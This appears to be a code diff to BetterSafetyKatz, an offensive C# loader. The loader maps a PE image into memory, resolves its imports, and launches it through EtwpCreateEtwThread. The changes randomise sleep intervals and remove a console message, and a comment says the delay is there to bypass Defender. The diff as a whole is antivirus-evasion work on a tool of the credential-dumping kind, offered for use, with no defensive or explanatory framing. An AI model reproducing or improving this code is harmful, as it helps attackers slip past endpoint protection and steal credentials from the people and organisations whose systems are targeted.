@@ -279,7 +279,7 @@ namespace BetterSafetyKatz
 
 
                     //Sleep between each DLL re-location
-                    Thread.Sleep(10);
+                    Thread.Sleep(Helpers.RandomNumber(3, 10));
 
                     IntPtr handle = WINLib.LoadLibrary(DllName);
 
@@ -290,7 +290,7 @@ namespace BetterSafetyKatz
                         string DllFuncName = Marshal.PtrToStringAnsi((IntPtr)((long)(dllFuncNamePTR.ToInt64() + (int)2)));
 
                         //ForEach function aswell
-                        Thread.Sleep(10);
+                        Thread.Sleep(Helpers.RandomNumber(5,10));
 
                         IntPtr funcAddy = WINLib.GetProcAddress(handle, DllFuncName);
                         Marshal.WriteInt64(a2, (long)funcAddy);
@@ -299,12 +299,10 @@ namespace BetterSafetyKatz
 
                     }
                 }
-
-                Console.WriteLine("[+] Creating thread!");
                 IntPtr threadStart = (IntPtr)((long)(codebase.ToInt64() + (int)pe.OptionalHeader64.AddressOfEntryPoint));
 
                 //This is needed for bypass , ¯\_(ツ)_/¯ Defender is weird
-                Thread.Sleep(2000);
+                Thread.Sleep(Helpers.RandomNumber(2450, 3800));
 
                 //Ripped from https://gist.github.com/TheWover/b2b2e427d3a81659942f4e8b9a978dc3
                 IntPtr hThread = WINLib.EtwpCreateEtwThread(threadStart, IntPtr.Zero);
